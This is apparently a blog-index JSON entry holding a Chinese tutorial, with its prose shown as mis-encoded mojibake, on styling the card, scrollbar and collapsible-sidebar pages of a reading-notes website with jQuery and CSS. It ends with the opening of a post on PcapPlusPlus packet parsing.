$(e.currentTarget); let card_offset_scrolltop = $(card).offset().top - $(window).scrollTop(); $(card).css(\u0026#39;--data-offset-top\u0026#39;, card_offset_scrolltop * -1 + \u0026#39;px\u0026#39;); $(card).toggleClass(\u0026#39;active\u0026#39;); let height = $(window).height(); let ratio = 480/420; height -= $(card).find(\u0026#39;img\u0026#39;).outerHeight() * ratio; height -= $(card).find(\u0026#39;h4\u0026#39;).outerHeight() * ratio; height /= ratio; $(card).find(\u0026#39;.content\u0026#39;).css(\u0026#39;height\u0026#39;, height); if ($(card).hasClass(\u0026#39;active\u0026#39;)) { $(\u0026#39;body\u0026#39;).addClass(\u0026#39;noscroll\u0026#39;); } else { $(\u0026#39;body\u0026#39;).removeClass(\u0026#39;noscroll\u0026#39;); } }); } \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;card\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;https://source.unsplash.com/900x600/?nature,water,1\u0026#34; /\u0026gt; \u0026lt;h4\u0026gt;Title1\u0026lt;/h4\u0026gt; \u0026lt;div class=\u0026#34;content-wrapper\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;p\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;card\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;https://source.unsplash.com/900x600/?nature,water,2\u0026#34; /\u0026gt; \u0026lt;h4\u0026gt;Title2\u0026lt;/h4\u0026gt; \u0026lt;div class=\u0026#34;content-wrapper\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;p\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;card\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;https://source.unsplash.com/900x600/?nature,water,3\u0026#34; /\u0026gt; \u0026lt;h4\u0026gt;Title3\u0026lt;/h4\u0026gt; \u0026lt;div class=\u0026#34;content-wrapper\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;p\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;card\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;https://source.unsplash.com/900x600/?nature,water,4\u0026#34; /\u0026gt; \u0026lt;h4\u0026gt;Title4\u0026lt;/h4\u0026gt; \u0026lt;div class=\u0026#34;content-wrapper\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;p\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Step02 ç§»é™¤å›¾ç‰‡\u0026amp;æ ·å¼è°ƒæ•´ Stevenå¤§ä½¬åšå‡ºæ¥çš„æ•ˆæœï¼Œå¯¹ img çš„æ“ä½œå äº†æ¯”è¾ƒå¤§çš„éƒ¨åˆ†ï¼›ä¸è¿‡æˆ‘çš„éœ€æ±‚æ˜¯æ–‡å­—æ‘˜æŠ„ï¼Œå¹¶ä¸éœ€è¦è¿™ä¹ˆå¤šçš„å›¾ç‰‡ï¼Œå› æ­¤å†³å®šå°†è¿™äº›å›¾ç‰‡ç§»é™¤æ‰ã€‚åŒæ—¶ï¼ŒæŠŠCSSä¸­å…³äºå›¾ç‰‡çš„æ ·å¼ä¹Ÿå…¨éƒ¨ç§»é™¤ã€‚\næ­¤å¤–ï¼Œåœ¨demoä¸­é™å®šäº† --card-width: 420px ï¼Œè¿™æ˜¯å› ä¸ºä½œè€…å‡è®¾äº†ä½¿ç”¨åœºæ™¯æ˜¯å°å±å¹•ï¼›æˆ‘çš„ä½¿ç”¨åœºæ™¯ä¸æ˜¯å°å±å¹•ï¼Œå› æ­¤å°†è¿™ä¸ªæ•°å€¼æ”¹å¤§ä¸€äº›ï¼š --card-width: 80% ã€‚\nç°æœ‰çš„å¸ƒå±€ç»“æ„æ˜¯ä¸€ä¸ª card ä¸‹æœ‰ä¸€ä¸ªæ ‡é¢˜ h4 å’Œå†…å®¹éƒ¨åˆ† content-wrapper ï¼Œæˆ‘å†³å®šå°†ä»–ä»¬å…¨éƒ¨ä¿ç•™ï¼Œä¸è¿‡ç§»é™¤äº†å›¾ç‰‡ä¹‹åï¼Œæ ·å¼å˜å¾—æœ‰ç‚¹å¥‡æ€ªï¼Œéœ€è¦è¿›è¡Œä¸€äº›è°ƒæ•´ã€‚\nå¡ç‰‡é«˜åº¦è¦ç¼©å°ï¼Œå› ä¸ºå·²ç»æ²¡æœ‰å›¾ç‰‡äº†ï¼› å†…å®¹å±•ç¤ºçš„æ—¶å€™ä¸èƒ½å±•ç¤ºå®Œå…¨ï¼Œåªå‘ˆç°å‡ºä¸‰è¡Œï¼Œè¶…è¿‡éƒ¨åˆ†ç”¨çœç•¥å·æ›¿ä»£ï¼›åŒæ—¶ï¼Œç‚¹å¼€å†…å®¹ä¹‹åè¦æŠŠè¿™äº›é™åˆ¶å»æ‰ï¼› ä¿ç•™åœ†è§’ï¼ˆè°ƒäº†è›®ä¹…æ‰æå‡ºæ¥ï¼Œæ„Ÿè§‰æœ€ç»ˆçš„ä»£ç å¹¶ä¸æ˜¯å¾ˆç®€æ´ï¼‰ï¼› æ»šåŠ¨æ¡ç¾åŒ–ï¼ˆè€æŠ€èƒ½äº†ï¼‰ã€‚ è°ƒæ•´ä¹‹åçš„CSSå˜ä¸ºï¼š\n:root { font-size: 15px; font-family: \u0026#39;Zhi Mang Xing\u0026#39;, cursive; --body-width: 100%; --card-width: 80%; --card-height: 150px; background-color: #333; } ::-webkit-scrollbar { width: 20px; background-color: #eee; } ::-webkit-scrollbar-track { background-color: transparent; } ::-webkit-scrollbar-thumb { background-color: #d6dee1; border-radius: 20px; border: 6px solid transparent; background-clip: content-box; } ::-webkit-scrollbar-thumb:hover { background-color: #a8bbbf; } body { width: var(--body-width); background-color: #eee; margin: auto; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 1rem 0; } body.noscroll { overflow: hidden; } .card { width: var(--card-width); height: var(--card-height); background-color: #fff; border-radius: 1rem; box-shadow: 0 .2rem 2rem rgba(0, 0, 0, .1); margin: 1rem 0; transition: .3s all cubic-bezier(0, 1, 0.95, 1.05); } .card h4 { margin: 0; font-size: 1.8rem; font-weight: bold; padding: .8rem 1.2rem; background-color: #fff; line-height: 2rem; letter-spacing: -.5px; padding-bottom: 0; border-radius: 1rem; } .card .content-wrapper { transition: .3s all ease-out; opacity: .8; } .card .content-wrapper .content { padding: 0 1.2rem; background-color: #fff; overflow: hidden; display: -webkit-box; -webkit-box-orient: vertical; -webkit-line-clamp: 3; border-radius: 1rem; } .card p { font-size: 1.5rem; line-height: 2rem; } /* active classes */ .card.active { transform: translateY(var(--data-offset-top)) scale(calc(480/420)); transform-origin: 50% 0; border-radius: 0; z-index: 99; } .card.active h4 { padding-bottom: .8rem; } .card.active .content-wrapper { height: 100vh; transition: .3s all ease-in; opacity: 1; } .card.active .content-wrapper .content { display: block; height: 80%; } ç›®å‰çš„æ•ˆæœï¼ˆåŠ¨å›¾ï¼‰ å®Œæˆäº†ä»¥ä¸Šçš„å¾®è°ƒä¹‹åï¼Œéœ€è¦è¿›è¡Œç»†èŠ‚éƒ¨åˆ†çš„å¤§æ”¹åŠ¨äº†ï¼Œæˆ‘å°†åˆ†ä¸ºå‡ ä¸ªç»†èŠ‚æ¥è¿›è¡Œå¤„ç†ã€‚\næ»šåŠ¨æ¡ç¾åŒ– æ»šåŠ¨æ¡ç¾åŒ–æ˜¯æ­¤å‰å¯¹ä¸ªäººåšå®¢è¿›è¡Œä¼˜åŒ–æ—¶æ¥è§¦è¿‡çš„ä¸œè¥¿ï¼Œæ€»ä½“æ¥è¯´å°±æ˜¯ä½¿ç”¨CSSä¸€ç³»åˆ—é€‰æ‹©å™¨æ¥é€‰ä¸­æ»šåŠ¨æ¡çš„å¯¹åº”éƒ¨åˆ†ã€‚åœ¨ä¸Šé¢çš„CSSä¸­ï¼Œæˆ‘å°†æ»šåŠ¨æ¡èƒŒæ™¯é¢œè‰²è®¾ç½®ä¸ºäº† #eee ï¼Œå³æ­£å¸¸æƒ…å†µä¸‹çš„èƒŒæ™¯é¢œè‰²ï¼Œè€Œè¿™å¯¼è‡´äº†ä¸€ä¸ªé—®é¢˜ï¼šå½“æˆ‘ç‚¹å¼€ä¸€ä¸ªå…·ä½“çš„æ‘˜æŠ„ï¼Œå…¶ä¸­æ–‡å­—å†…å®¹éœ€è¦è¿›è¡Œæ»šåŠ¨æ—¶ï¼Œæ»šåŠ¨æ¡çš„é¢œè‰²è·Ÿå¡ç‰‡é¢œè‰²æœ‰ç‚¹ä¸åè°ƒï¼Œå¾ˆå‡ºæˆã€‚\nå½“å‰æ»šåŠ¨æ¡èƒŒæ™¯çš„ä¸åè°ƒ ä¼˜åŒ–çš„æ€è·¯å¾ˆç®€å•ï¼Œä½¿ç”¨ä¸€ä¸ªCSSå˜é‡æ¥è®¾ç½®é¢œè‰²ï¼›é…åˆæ­¤å‰å·²ç»æœ‰äº†çš„jQueryå¯¹ç‚¹å‡»äº‹ä»¶çš„åˆ¤æ–­ï¼Œæ”¹å˜è¿™ä¸ªèƒŒæ™¯é¢œè‰²å³å¯ã€‚\næ—¢ç„¶å·²ç»æåˆ°äº†ä½¿ç”¨å˜é‡ï¼Œæˆ‘å°± ç»Ÿä¸€å°†å„ä¸ªèƒŒæ™¯é¢œè‰²å…¨éƒ¨ä½¿ç”¨å˜é‡è¿›è¡Œæ§åˆ¶ ï¼Œä½œå‡ºçš„ç›¸åº”ä¿®æ”¹åœ¨æ­¤ä¸è¡¨ã€‚\nä½¿ç”¨ --scrollbar-bg-color: #eee; ä½œä¸ºæ»šåŠ¨æ¡é»˜è®¤èƒŒæ™¯é¢œè‰²ï¼ˆä¸ body èƒŒæ™¯é¢œè‰²ä¸€è‡´ï¼‰ï¼Œåœ¨jQueryåˆ¤æ–­ç‚¹å‡»çš„é‚£éƒ¨åˆ†ä»£ç ä¸­åŠ ä¸Šå¯¹è¿™ä¸ªé¢œè‰²å˜é‡çš„æ§åˆ¶ï¼š\nif ($(card).hasClass(\u0026#39;active\u0026#39;)) { $(\u0026#39;body\u0026#39;).addClass(\u0026#39;noscroll\u0026#39;); $(\u0026#39;:root\u0026#39;).css(\u0026#39;--scrollbar-bg-color\u0026#39;, \u0026#39;#fff\u0026#39;); } else { $(\u0026#39;body\u0026#39;).removeClass(\u0026#39;noscroll\u0026#39;); $(\u0026#39;:root\u0026#39;).css(\u0026#39;--scrollbar-bg-color\u0026#39;, \u0026#39;#eee\u0026#39;); } æå®šï¼\nå¡ç‰‡ç¼©æ”¾ç¾åŒ– Stevenå¤§ä½¬çš„å¡ç‰‡ç¼©æ”¾ï¼Œç”±äºæœ‰ä¸€å¼ å°ºå¯¸è¾ƒå¤§çš„å›¾ï¼Œä½¿å¾—åŸæœ¬â€œé¡¶å¤©ç«‹åœ°â€çš„ç¼©æ”¾æ•ˆæœå°±æ˜¾å¾—å¾ˆå‡ºè‰²ã€‚åœ¨æˆ‘çš„ä½¿ç”¨åœºæ™¯ä¸­ï¼Œå·²ç»å°†å›¾ç‰‡å»æ‰äº†ï¼Œå¦‚æœç»§ç»­â€œé¡¶å¤©ç«‹åœ°â€ä¸‹å»ï¼Œå°±ä¼šé€ æˆå¡ç‰‡ä¸‹ç«¯çš„å¤§é‡ç©ºç™½ã€‚\nå¡ç‰‡ä¸‹ç«¯å¤§é‡ç©ºç™½ æ¯«æ— ç–‘é—®ï¼Œè¿™æ ·çš„æ•ˆæœæ˜¯å¾ˆä¸å¥½çš„ï¼Œå³ä¾¿æˆ‘åç»­å°†è¦å¯¹å¡ç‰‡çš„ç»“æ„è¿›è¡Œä¸€äº›è°ƒæ•´ï¼Œè¯»ä¹¦æ‘˜æŠ„è¿™ç§æœ‰é™çš„å†…å®¹ä»ç„¶å¾ˆéš¾é“ºæ»¡ä¸€ä¸ªæµè§ˆå™¨çª—å£ã€‚\næˆ‘çš„ç†æƒ³æ”¾å¤§æ•ˆæœæ˜¯ï¼šå†…å®¹åŸºæœ¬ä½äºçª—å£ä¸­å¿ƒï¼Œä¸Šä¸‹å·¦å³éƒ½ç•™å‡ºä¸€äº›ç©ºç™½ã€‚\nåŸºäºåŸæœ‰çš„ä»£ç ï¼Œè¦å®ç°å†…å®¹å±…ä¸­è¾ƒä¸ºå®¹æ˜“ã€‚åŸæœ¬çš„ä»£ç ä¼šè®¡ç®— --data-offset-top ï¼Œç„¶åå¯¹å¡ç‰‡è¿›è¡Œä¸€ä¸ª translateY çš„æ“ä½œï¼Œå°†å¡ç‰‡ç§»åˆ°é¡µé¢é¡¶éƒ¨ï¼›æˆ‘ä¸å¸Œæœ›å¡ç‰‡â€œå¤´é¡¶å¤©â€ï¼Œå› æ­¤å°†è¿™ä¸ª --data-offset-top çš„å€¼ä¿®æ”¹ä¸€ä¸‹å³å¯ã€‚\nå…·ä½“çš„æ“ä½œæ˜¯ï¼šå…ˆè·å– $(window).height() å³çª—å£é«˜åº¦ï¼Œç„¶åæŠŠ --data-offset-top åŠ ä¸Šçª—å£é«˜åº¦çš„ä¸€å®šæ¯”ä¾‹ã€‚\nå®ç°å‡ºæ¥çš„æ•ˆæœç±»ä¼¼äºä¸ºå¡ç‰‡åŠ ä¸Šäº† margin-top ã€‚\nè€Œä¸ºäº†ä¸è®©å¡ç‰‡â€œè„šç€åœ°â€ï¼Œåªéœ€è¦æŠŠå¡ç‰‡çš„ height å‡å°å³å¯ã€‚åœ¨åŸæœ¬çš„ä»£ç ä¸­ï¼Œè¿™ä¸ªé«˜åº¦é€šè¿‡ .card.active .content-wrapper æ¥æ§åˆ¶ï¼Œæˆ‘å°†å…¶æ”¹ä¸ºä¸€ä¸ªå˜é‡ var(--content-wrapper-height-expended) ï¼Œåœ¨å¡ç‰‡å±•å¼€çš„æ—¶å€™ï¼Œè®¾ç½®è¿™ä¸ªå˜é‡çš„å€¼ä¸ºçª—å£é«˜åº¦çš„ä¸€å®šæ¯”ä¾‹ã€‚\nåŒæ—¶ï¼Œä¸ºäº†ä¸è®© content æŠŠ content-wrapper æ’‘å¤§ï¼Œè¦ä¸ºè¿™ä¸ªå…ƒç´ è®¾ç½® height ï¼Œä½¿å®ƒè‡³å¤šè·Ÿçˆ¶å…ƒç´ åŒæ ·é«˜ã€‚\nå®ç°å‡ºæ¥çš„æ•ˆæœç±»ä¼¼äºä¸ºå¡ç‰‡åŠ ä¸Šäº† margin-bottom ã€‚\nå¯¹å¡ç‰‡å±•å¼€çš„æ¯”ä¾‹è¿›è¡Œè°ƒæ•´ä¹‹åï¼Œå¤§å°æ˜¯åˆç†äº†ï¼Œä¸è¿‡å‡ºç°äº†æ–°çš„é—®é¢˜ï¼š\nèƒŒåçš„æ–‡å­—æ²¡æœ‰éšè—æ‰ è¿™ä¸ªé—®é¢˜å®é™…ä¸ŠèŠ±äº†æˆ‘ä¸€æ®µæ—¶é—´ï¼Œæœ€åçš„è§£å†³æ–¹æ¡ˆæ˜¯ï¼šæ–°å¢ä¸€ä¸ªå…¨å±çš„â€œé®ç½©â€å…ƒç´ ï¼ŒèƒŒæ™¯é¢œè‰²è®¾ç½®å¥½é€æ˜åº¦ï¼›é®ç½©åœ¨æ­£å¸¸æƒ…å†µä¸‹ z-index è¾ƒå°ä¸” display ä¸º none ï¼Œå¡ç‰‡å±•å¼€ä¹‹åæŠŠ z-index æŠ¬å‡åˆ° å±•å¼€çš„å¡ç‰‡ä¹‹ä¸‹ã€æœªå±•å¼€çš„å¡ç‰‡ä¹‹ä¸Š çš„ä½ç½®ï¼Œç„¶å display å‘ˆç°å‡ºæ¥ã€‚\næœ€ç»ˆç¼©æ”¾æ•ˆæœ æ³¨æ„è¿™è¾¹å±•å¼€ä¹‹åçœ‹èµ·æ¥å³è¾¹æ²¡æœ‰é—´éš™ï¼Œå®é™…ä¸Šæ˜¯GIFå½•åˆ¶è¿‡ç¨‹ä¸­çš„èŒƒå›´æœ‰é™æ‰€è‡´ã€‚\nç‚¹å‡»äº‹ä»¶ä¼˜åŒ– åŸæœ¬çš„å¡ç‰‡ç¼©æ”¾å®ç°æ–¹æ¡ˆæ˜¯ï¼šåœ¨ click äº‹ä»¶ä¸­è¿›è¡Œ toggleClass çš„æ“ä½œæ¥æ·»åŠ /ç§»é™¤ active è¿™ä¸ªç±»ï¼Œé€»è¾‘å¾ˆç®€å•ï¼Œä½†å¹¶ä¸å®Œå…¨å®ç”¨ã€‚\nå…¶ä¸­å¾ˆå…³é”®çš„ä¸€ç‚¹æ˜¯ï¼šå½“æˆ‘é€‰ä¸­ä¸€æ®µæ–‡å­—æ—¶ï¼Œä¹Ÿç®—ä½œè§¦å‘ click äº‹ä»¶ï¼›è€Œæ¯«æ— ç–‘é—®ï¼Œå½“è¯»è€…é€‰ä¸­æŸäº›æ–‡å­—çš„æ—¶å€™å¸Œæœ›è¿›è¡Œçš„æ˜¯å¤åˆ¶ä¹‹ç±»çš„æ“ä½œï¼Œå‡å¦‚è§¦å‘äº† click äº‹ä»¶ï¼Œå¡ç‰‡å°±ä¼šç¼©å›å»ï¼Œé€‰ä¸­çš„æ–‡å­—ä¹Ÿå°±ä¸¢å¤±äº†ã€‚\nç‚¹å‡»äº‹ä»¶æ„å¤–è§¦å‘ ä¿®å¤å®ƒçš„åšæ³•æ¯”è¾ƒç®€å•ï¼šåœ¨ click äº‹ä»¶ä¸­åˆ¤æ–­ä¸€ä¸‹å½“å‰æ˜¯å¦é€‰ä¸­äº†æ–‡æœ¬ï¼Œè‹¥å­˜åœ¨ï¼Œåˆ™è¯´æ˜å¡ç‰‡ç¼©æ”¾çš„æ­¥éª¤ä¸åº”è¯¥æ‰§è¡Œï¼Œå¦åˆ™å†æŒ‰ç…§åŸæœ‰çš„æµç¨‹æ‰§è¡Œå¡ç‰‡ç¼©æ”¾ã€‚\nlet txt = \u0026#39;\u0026#39;; if (window.getSelection) { txt = window.getSelection().toString(); } else { txt = document.selection.createRange().text; } if (txt == \u0026#39;\u0026#39;) { // åŸæœ‰çš„å¡ç‰‡ç¼©æ”¾æ­¥éª¤ } ä¿®å¤åçš„ç‚¹å‡»äº‹ä»¶ ç¼©æ”¾äº‹ä»¶ä¼˜åŒ– å¡ç‰‡å±•å¼€ä¹‹åç¼©å›ï¼Œå­˜åœ¨ä¸€ä¸ªä¸åˆ°ä½çš„ç»†èŠ‚æ˜¯ï¼šå†…å®¹æ²¡æœ‰å›åˆ°é¦–è¡Œã€‚\nç¼©æ”¾ç»†èŠ‚ä¸åˆ°ä½ è¿™ä½¿å¾—ä½“éªŒå¾ˆå‰²è£‚ï¼Œå°¤å…¶å½“æˆ‘æ·»åŠ äº† ä¹¦ç±åç§° ã€ å‘å¸ƒæ—¥æœŸ ç­‰å…ƒç´ ä¹‹åï¼Œå‡ºç°äº†é‡å ã€‚\nè§£å†³çš„åŠæ³•æ˜¯ï¼šåœ¨å¡ç‰‡å›å¼¹çš„å‡½æ•°ä¸­ï¼Œé€‰ä¸­ content-wrapper å¹¶å°†ä½¿ç”¨ scrollTop(0) å°†å®ƒçš„åç§»é‡é‡ç½®ä¸º 0 ã€‚\nStep03 æ·»åŠ ä¼¸ç¼©ä¾§è¾¹æ  åœ¨ä¸€ä¸ªè¯»ä¹¦æ‘˜æŠ„çš„ç«™ç‚¹ä¸­ï¼Œæ ¹æ®ä¹¦ç±è¿›è¡Œåˆ†ç±»åº”è¯¥æ˜¯æœ€åŸºæœ¬çš„éœ€æ±‚ã€‚\næˆ‘çš„æ„æ€æ˜¯æ·»åŠ ä¸€ä¸ªå¯ä¼¸ç¼©çš„ä¾§è¾¹æ ï¼Œä¾§è¾¹æ ä¸Šå‘ˆç°å‡ºæ‰€æœ‰çš„ä¹¦ç±ï¼Œç‚¹å‡»æ—¶è¿›è¡Œå¼‚æ­¥é€šä¿¡ï¼Œåå°æ ¹æ®ä¹¦ç±åç§°ç­›é€‰è¯»ä¹¦æ‘˜æŠ„ã€‚\nå®ç°è¿™ä¸ªä¾§è¾¹æ éœ€è¦å¯¹é¡µé¢ç»“æ„è¿›è¡Œå¦‚ä¸‹çš„è°ƒæ•´ï¼š\nåœ¨åŸæœ‰çš„è‹¥å¹²å¡ç‰‡å¤–å±‚å†æ·»åŠ ä¸€ä¸ª div åŒ…è£¹èµ·æ¥ï¼Œå®ç°å®Œæ•´æ€§ï¼› æ·»åŠ ä¸€ä¸ª position: fixed çš„å…ƒç´ ï¼Œæ”¾ç½®åœ¨é¡µé¢å³ä¾§ï¼› æ·»åŠ ä¸€ä¸ªå¯ç‚¹å‡»çš„å…ƒç´ ï¼Œç‚¹å‡»ä¹‹åè§¦å‘ä¾§è¾¹æ ä¼¸ç¼©ã€‚ ä¾§è¾¹æ å…ƒç´ çš„æ·»åŠ æ¯”è¾ƒç®€å•ï¼šå‡å®šä¾§è¾¹æ çš„å®½åº¦æ˜¯ 10% ï¼Œç”±äºä½¿ç”¨äº† fixed å±æ€§ä½¿å¾—å®½åº¦æ¯”ä¾‹çš„è®¡ç®—æŒ‰ç…§å¤–å±‚çª—ä½“è¿›è¡Œï¼Œå› æ­¤ body è¦ä¸ºä¾§è¾¹æ è®©å‡º 10% çš„ç©ºé—´ï¼Œä½¿ç”¨ padding-right: 10% å®ç°ï¼›\næŒ‰ç…§ç›¸åŒåŠæ³•æ·»åŠ ä¸€ä¸ª fixed å…ƒç´ å……å½“æŒ‰é’®ï¼Œæ³¨æ„è®¡ç®—æŒ‰é’®ä½ç½®å³å¯ã€‚æŒ‰é’®ç‚¹å‡»æ—¶åˆ¤æ–­ä¾§è¾¹æ æ˜¯å¦æœ‰å®½åº¦ï¼Œè‹¥æœ‰ï¼Œè¯´æ˜åº”è¯¥å°†ä¾§è¾¹æ æ”¶ç¼©ï¼Œä¿®æ”¹ä¾§è¾¹æ å®½åº¦å’Œ body çš„ padding-right ä¸ºé›¶ï¼›è‹¥ä¾§è¾¹æ æ— å®½åº¦ï¼Œè¯´æ˜åº”è¯¥å±•å¼€ï¼Œå°†äºŒè€…æ”¹å›åŸæœ‰çš„ 10% å³å¯ã€‚\nä¾§è¾¹æ ä¸­è¦æ”¾ç½®ä¹¦ç±åç§°ï¼Œä½¿ç”¨ç±»ä¼¼äºä¸»ä½“éƒ¨åˆ†çš„å¡ç‰‡çš„å¸ƒå±€è¿›è¡Œå®ç°ï¼›ä¹¦ç±åç§°çš„æ–‡å­—éƒ¨åˆ†ä½¿ç”¨ writing-mode: vertical-rl; å’Œ text-align: center; æ¥ä½¿æ–‡å­—å±…ä¸­å‚ç›´æ’åˆ—ã€‚\næœ€ç»ˆæ•ˆæœ Step04 ä¾§è¾¹æ è¿›ä¸€æ­¥å®Œå–„ åŸæœ¬ä»¥ä¸ºä¸Šä¸€æ­¥æ·»åŠ çš„ä¾§è¾¹æ å°±å¾ˆå¤Ÿç”¨äº†ï¼Œå¯æƒœéœ€æ±‚æ€»æ˜¯éšç€äººç±»çš„å¼‚æƒ³å¤©å¼€è€Œä¸æ–­å¢åŠ ã€‚\nè¿™ä¸€æ­¥éª¤ä¸»è¦å®Œå–„ä¸¤ç‚¹åŠŸèƒ½ï¼š\nç«™ç‚¹éœ€è¦å¯¹ç”¨æˆ·çš„ç™»å½•çŠ¶æ€è¿›è¡Œåˆ¤å®šï¼Œå› æ­¤å†³å®šå°†ç”¨æˆ·çš„ç™»å½•çŠ¶æ€å’Œç™»å½•æ¥å£æ”¾ç½®åœ¨ä¾§è¾¹æ ä¸Šï¼› åŸæœ‰çš„ä¾§è¾¹æ å¡ç‰‡æœ‰ä¸€äº›å°é—®é¢˜ï¼Œä¿®å¤ã€‚ ç¬¬ä¸€æ­¥ç›¸å½“äºåœ¨ä¾§è¾¹æ ä¸Šåˆæ–°å¢ä¸€ä¸ªå…ƒç´ äº†ã€‚åœ¨è‹¥å¹²ä¸ªä¹¦ç±å¡ç‰‡ ä¹‹å‰ æ–°å¢ä¸€ä¸ª \u0026lt;div id=\u0026quot;authentication\u0026quot;\u0026gt; ï¼Œæˆ‘çš„è®¾æƒ³æ˜¯ ç”¨æˆ·æœªç™»å½•ä¹‹å‰æ˜¾ç¤ºç™»å½•å…¥å£ã€ç”¨æˆ·ç™»å½•ä¹‹åæ˜¾ç¤ºä¸€ä¸ªå¤´åƒå›¾ç‰‡ ï¼Œå½“ç„¶ï¼Œç›®å‰è‚¯å®šæ˜¯ä¸æ”¯æŒæ›´æ¢å¤´åƒçš„ï¼Œå› æ­¤å›¾ç‰‡æŒ‰æˆ‘çš„å–œå¥½æ¥ ğŸ˜¸\næœªç™»å½•çŠ¶æ€å°±ä½¿ç”¨ æœªç™»å½• ä¸‰ä¸ªå­—æ¥è¡¨ç¤ºå³å¯ï¼Œç”¨ä¸€ä¸ª \u0026lt;a\u0026gt; æ ‡ç­¾æŠŠå®ƒåšæˆé“¾æ¥ï¼›è®¾ç½®è¿™ä¸ªæ ‡ç­¾çš„ position: relative ï¼Œç„¶åä½¿ç”¨ ::before ä¼ªå…ƒç´ æ¥å®ç°é¼ æ ‡ hover çš„æ•ˆæœï¼š\næœªç™»å½•é“¾æ¥ ç™»å½•çŠ¶æ€ä½¿ç”¨ä¸€å¼ æ­£æ–¹å½¢å›¾ç‰‡ï¼Œç„¶å border-radius: 100% æ”¹ä¸ºåœ†å½¢ï¼Œä¸è¡¨ã€‚æ³¨æ„æ­£å¸¸æƒ…å†µä¸‹å›¾ç‰‡æ€»æ˜¯èƒ½å¸å¼•ç”¨æˆ·ç‚¹å‡»ï¼Œå› æ­¤æˆ‘å¸Œæœ›å°†è¿™ä¸ªå›¾ç‰‡ä½œä¸ºå‘å¸ƒè¯»ä¹¦æ‘˜æŠ„çš„å…¥å£ã€‚\næ¥ç€æ˜¯ä¸€ä¸ªæå…¶é‡è¦çš„æ”¹åŠ¨ï¼šä¾§è¾¹æ æ»šåŠ¨çš„å¯ç”¨ã€‚æ­¤å‰çš„å¸ƒå±€çœ‹èµ·æ¥æ²¡æœ‰ä»€ä¹ˆæ¯›ç—…ï¼Œä½†å½“ä¹¦ç±å¤šèµ·æ¥ä¹‹åï¼Œå°±ä¼šï¼š\nä¹¦ç±å˜å¤šä¹‹åçš„ä¾§è¾¹æ  å¡ç‰‡è¢«å‹ç¼©äº†ï¼è¿™ä¸æ˜¯æˆ‘çš„æœ¬æ„ï¼Œæˆ‘å¸Œæœ›ä¹¦ç±å¤šèµ·æ¥ä¹‹åä¾§è¾¹æ å¯ä»¥å‘ä¸‹æ»šåŠ¨ï¼Œä¸è¦æŒ¤åœ¨è¿™ä¹ˆä¸€ä¸ªå°ç©ºé—´é‡Œã€‚\nä¿®æ”¹çš„åŠæ³•æ˜¯ï¼š\nåœ¨å¡ç‰‡æ ·å¼ä¸­ï¼ˆå³ #right-sidebar .book-card é€‰æ‹©å™¨ï¼‰åŠ ä¸Š flex-shrink: 0; ï¼› ä¾§è¾¹æ æ ·å¼ä¸­ï¼ˆå³ #right-sidebar é€‰æ‹©å™¨ï¼‰åŠ ä¸Š overflow: scroll; ï¼› ä¾§è¾¹æ æ»šåŠ¨æ¡éšè—ï¼ˆä½¿ç”¨ #right-sidebar::-webkit-scrollbar é€‰æ‹©å™¨è®¾ç½® display: none ï¼‰ã€‚ è‡³æ­¤å…ˆå‘Šä¸€æ®µè½å•¦ï¼\n","date":"2022-02-12T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E8%AF%BB%E4%B9%A6%E6%91%98%E6%8A%84%E7%AB%99%E7%82%B9%E6%9E%84%E5%BB%BA%E9%A1%B5%E9%9D%A2%E7%AF%87%E4%B9%8B%E4%B8%80/","title":"è¯»ä¹¦æ‘˜æŠ„ç«™ç‚¹æ„å»ºï¼ˆé¡µé¢ç¯‡|ä¹‹ä¸€ï¼‰"},{"content":"å‰æƒ…æè¦ åœ¨ ä¸Šä¸€ç¯‡PCPPä½¿ç”¨è®°å½• ä¸­ï¼Œæˆ‘è®°å½•äº†PcapPlusPlusè¿™ä¸ªåº“çš„ç¯å¢ƒå®‰è£…å’Œç®€å•ä½¿ç”¨ï¼Œç´§æ¥ç€ï¼Œå°±å‡†å¤‡åŸºäºè¿™ä¸ªåº“æ¥å®ç°ä¸€äº›å…·ä½“çš„ã€æœ‰ç”¨çš„åŠŸèƒ½äº†ã€‚\næ•°æ®åŒ…è§£æ PCPPè¿™ä¸ªåº“å°†ä¸€ä¸ªåŸå§‹æ•°æ®åŒ…è§£æä¸ºè‹¥å¹²å±‚ï¼Œæ¯ä¸€å±‚çš„åè®®ä¿¡æ¯ç”±ä¸€ä¸ªå˜é‡æ¥ä¿å­˜ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªç”±è¯»å†™è¿™äº›è§£æåçš„æ•°æ®ã€‚\nä¸€ä¸ª RawPacket è¡¨ç¤ºåŸå§‹çš„å­—èŠ‚æµï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æœ€å¼€å§‹ä» pcap 